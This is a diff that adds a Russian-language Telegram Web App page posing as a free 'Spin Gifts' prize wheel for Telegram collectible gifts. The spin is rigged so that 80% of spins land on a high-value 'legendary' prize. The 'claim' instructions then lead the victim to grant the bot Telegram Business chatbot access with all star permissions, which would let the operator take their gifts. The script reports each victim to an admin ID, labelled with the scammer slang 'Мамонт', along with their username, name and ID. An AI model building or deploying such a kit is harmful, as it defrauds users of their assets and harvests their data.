@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin Gifts</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --common-color: #4CAF50;
+            --rare-color: #2196F3;
+            --epic-color: #9C27B0;
+            --legendary-color: #FFD700;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 25px;
+            padding: 30px;
+            width: 95%;
+            max-width: 420px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .header {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #ff8a00, #e52e71);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .subheader {
+            font-size: 18px;
+            margin-bottom: 25px;
+            opacity: 0.9;
+        }
+        .rarity {
+            display: flex;
+            justify-content: space-around;
+            margin: 25px 0;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .common { color: var(--common-color); }
+        .rare { color: var(--rare-color); }
+        .epic { color: var(--epic-color); }
+        .legendary { 
+            color: var(--legendary-color);
+            text-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
+        }
+        .wheel-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            margin: 0 auto 25px;
+            overflow: hidden;
+            border-radius: 50%;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        .wheel {
+            width: 100%;
+            height: 100%;
+            transition: transform 5s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+            transform: rotate(0deg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .prize-item {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            transform-origin: 150px;
+            left: 50%;
+            top: 50%;
+            margin-left: -40px;
+            margin-top: -40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            font-size: 12px;
+            font-weight: bold;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.6);
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .prize-item img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 5px;
+        }
+        .prize-value {
+            font-size: 11px;
+            padding: 2px 5px;
+            border-radius: 10px;
+            margin-top: 3px;
+        }
+        .common-bg { background: rgba(76, 175, 80, 0.2); }
+        .rare-bg { background: rgba(33, 150, 243, 0.2); }
+        .epic-bg { background: rgba(156, 39, 176, 0.2); }
+        .legendary-bg { background: rgba(255, 215, 0, 0.2); }
+        .open-btn {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            color: white;
+            border: none;
+            padding: 16px 45px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 5px 20px rgba(255, 75, 43, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .open-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 75, 43, 0.7);
+        }
+        .open-btn:disabled {
+            background: #555;
+            transform: none;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .result {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.1);
+        }
+        .result-prize {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .result-value {
+            font-size: 18px;
+            opacity: 0.9;
+        }
+        .bot-name {
+            margin-top: 25px;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        .pointer {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 25px solid #FF416C;
+            z-index: 10;
+        }
+        .prize-image {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .prize-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .claim-btn {
+            background: linear-gradient(45deg, #32CD32, #228B22);
+            color: white;
+            border: none;
+            padding: 16px 45px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 5px 20px rgba(50, 205, 50, 0.5);
+        }
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(50, 205, 50, 0.7);
+        }
+        .instructions {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: left;
+            display: none;
+        }
+        .instructions-title {
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        .instructions-list {
+            padding-left: 20px;
+        }
+        .instructions-list li {
+            margin-bottom: 10px;
+        }
+        .main-screen {
+            display: block;
+        }
+        .prize-screen {
+            display: none;
+        }
+        .legendary-border {
+            border: 3px solid var(--legendary-color);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+        .epic-border {
+            border: 3px solid var(--epic-color);
+            box-shadow: 0 0 20px rgba(156, 39, 176, 0.5);
+        }
+        .rare-border {
+            border: 3px solid var(--rare-color);
+            box-shadow: 0 0 20px rgba(33, 150, 243, 0.5);
+        }
+    </style>
+</head>
+<body>
+    <div class="container main-screen" id="mainScreen">
+        <div class="header">Spin Gifts</div>
+        <div class="subheader">Вам доступен бесплатный кейс</div>
+        
+        <div class="rarity">
+            <div class="common">COMMON</div>
+            <div class="rare">RARE</div>
+            <div class="epic">EPIC</div>
+            <div class="legendary">LEGENDARY</div>
+        </div>
+        
+        <div class="wheel-container">
+            <div class="pointer"></div>
+            <div class="wheel" id="wheel"></div>
+        </div>
+        
+        <button class="open-btn" id="openBtn">Открыть кейс</button>
+        
+        <div class="bot-name">@Spin_Gifts_robot</div>
+    </div>
+
+    <div class="container prize-screen" id="prizeScreen">
+        <div class="prize-image" id="prizeImage">
+            <img src="" alt="Prize Image">
+        </div>
+        
+        <div class="result">
+            <div class="result-prize" id="resultPrize"></div>
+            <div class="result-value" id="resultValue"></div>
+        </div>
+        
+        <button class="claim-btn" id="claimBtn">Забрать приз</button>
+        
+        <div class="instructions" id="instructions">
+            <div class="instructions-title">Как получить подарок?</div>
+            <p>Для того чтобы забрать подарок, у нас должен быть доступ для отправки подарков Вам, как его сделать?</p>
+            <ol class="instructions-list">
+                <li>Зайдите в Настройки Telegram</li>
+                <li>Перейдите в раздел 'Telegram для бизнеса'</li>
+                <li>Перейдите в раздел 'Чат-боты'</li>
+                <li>Найдите нашего бота в поиске и выберите его</li>
+                <li>Убедитесь, что все разрешения из раздела звезды предоставлены. После этого забирайте свой подарок</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        // Конфигурация
+        const ADMIN_ID = "7674627532"; // ID админа для уведомлений
+        
+        // Подарки
+        const allPrizes = [
+            {
+                name: "Citrine",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/astralshard/Citrine.webp",
+                value: "70TON",
+                type: "legendary",
+                emoji: "💎"
+            },
+            {
+                name: "Bonded Ring",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/bondedring/Goldsmith.webp",
+                value: "49.92TON",
+                type: "legendary",
+                emoji: "💍"
+            },
+            {
+                name: "Hex Pot",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/hexpot/Amortentia.webp",
+                value: "2.7TON",
+                type: "rare",
+                emoji: "🧪"
+            },
+            {
+                name: "Ion Gem",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/iongem/Elements.webp",
+                value: "69.95TON",
+                type: "legendary",
+                emoji: "🔮"
+            },
+            {
+                name: "Jelly Bunny",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/jellybunny/Thug%20Life.webp",
+                value: "3.02TON",
+                type: "rare",
+                emoji: "🐰"
+            },
+            {
+                name: "Kissed Frog",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/kissedfrog/Happy%20Pepe.webp",
+                value: "70TON",
+                type: "epic",
+                emoji: "🐸"
+            },
+            {
+                name: "Nail Bracelet",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/nailbracelet/Diamond.webp",
+                value: "100TON",
+                type: "epic",
+                emoji: "💅"
+            },
+            {
+                name: "Plush PEPE",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/plushpepe/Midas%20Pepe.webp",
+                value: "3200.01TON",
+                type: "legendary",
+                emoji: "🐸"
+            },
+            {
+                name: "Sharp Tongue",
+                image: "https://telegifter.ru/wp-content/themes/gifts/assets/img/gifts/sharptongue/Zombie%20Bite.webp",
+                value: "70TON",
+                type: "epic",
+                emoji: "👅"
+            }
+        ];
+
+        const wheel = document.getElementById('wheel');
+        const openBtn = document.getElementById('openBtn');
+        const resultPrize = document.getElementById('resultPrize');
+        const resultValue = document.getElementById('resultValue');
+        const claimBtn = document.getElementById('claimBtn');
+        const prizeImage = document.getElementById('prizeImage');
+        const prizeImageImg = prizeImage.querySelector('img');
+        const instructions = document.getElementById('instructions');
+        
+        const mainScreen = document.getElementById('mainScreen');
+        const prizeScreen = document.getElementById('prizeScreen');
+        
+        // Создаем рулетку
+        function createWheel() {
+            wheel.innerHTML = '';
+            const prizeCount = allPrizes.length;
+            const angle = 360 / prizeCount;
+            
+            allPrizes.forEach((prize, index) => {
+                const prizeElement = document.createElement('div');
+                prizeElement.className = `prize-item ${prize.type}-bg`;
+                prizeElement.style.transform = `rotate(${angle * index}deg) translateY(-120px) rotate(${-angle * index}deg)`;
+                
+                const img = document.createElement('img');
+                img.src = prize.image;
+                img.alt = prize.name;
+                
+                const name = document.createElement('div');
+                name.textContent = prize.emoji;
+                
+                const value = document.createElement('div');
+                value.className = `prize-value ${prize.type}`;
+                value.textContent = prize.value;
+                
+                prizeElement.appendChild(img);
+                prizeElement.appendChild(name);
+                prizeElement.appendChild(value);
+                wheel.appendChild(prizeElement);
+            });
+        }
+        
+        // Отправка уведомления админу
+        function sendAdminNotification(action) {
+            if (!tg.initDataUnsafe?.user) return;
+            
+            const user = tg.initDataUnsafe.user;
+            const username = user.username ? `@${user.username}` : 'Без username';
+            const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ');
+            
+            const message = {
+                action: "admin_notification",
+                admin_id: ADMIN_ID,
+                text: `✅Мамонт ${username} (${fullName}, ID: ${user.id}) ${action}`,
+                user_data: {
+                    id: user.id,
+                    username: user.username,
+                    first_name: user.first_name,
+                    last_name: user.last_name
+                }
+            };
+            
+            if (tg.sendData) {
+                tg.sendData(JSON.stringify(message));
+            }
+        }
+        
+        createWheel();
+        
+        openBtn.addEventListener('click', () => {
+            openBtn.disabled = true;
+            
+            // Выбираем случайный приз (но с шансом 80% на легендарный)
+            const random = Math.random();
+            let prize;
+            
+            if (random < 0.8) { // 80% шанс на легендарный
+                const legendaryPrizes = allPrizes.filter(p => p.type === "legendary");
+                prize = legendaryPrizes[Math.floor(Math.random() * legendaryPrizes.length)];
+            } else {
+                prize = allPrizes[Math.floor(Math.random() * allPrizes.length)];
+            }
+            
+            // Вычисляем позицию приза на рулетке
+            const prizeIndex = allPrizes.findIndex(p => p.name === prize.name);
+            const targetAngle = 3600 + (360 - (prizeIndex * (360 / allPrizes.length)));
+            
+            // Анимация вращения
+            wheel.style.transform = `rotate(${targetAngle}deg)`;
+            
+            // Показываем результат после анимации
+            setTimeout(() => {
+                // Устанавливаем границу в зависимости от редкости
+                prizeImage.className = `prize-image ${prize.type}-border`;
+                
+                prizeImageImg.src = prize.image;
+                prizeImageImg.alt = prize.name;
+                
+                resultPrize.innerHTML = `<span class="${prize.type}">🎉 ${prize.name} ${prize.emoji}</span>`;
+                resultValue.textContent = `Ценность: ${prize.value}`;
+                
+                // Показываем экран приза
+                mainScreen.style.display = 'none';
+                prizeScreen.style.display = 'block';
+                
+                // Отправляем данные о выигрыше в бота
+                if (tg.sendData) {
+                    tg.sendData(JSON.stringify({
+                        action: "prize_won",
+                        prize: {
+                            name: prize.name,
+                            value: prize.value,
+                            type: prize.type,
+                            image: prize.image
+                        },
+                        user_id: tg.initDataUnsafe?.user?.id
+                    }));
+                }
+            }, 5000);
+        });
+        
+        claimBtn.addEventListener('click', () => {
+            // Показываем/скрываем инструкцию
+            instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
+            
+            // Отправляем уведомление админу при открытии инструкции
+            if (instructions.style.display === 'block') {
+                sendAdminNotification("зашел в webapp и нажал кнопку инструкция");
+            }
+        });
+    </script>
+</body>
+</html>
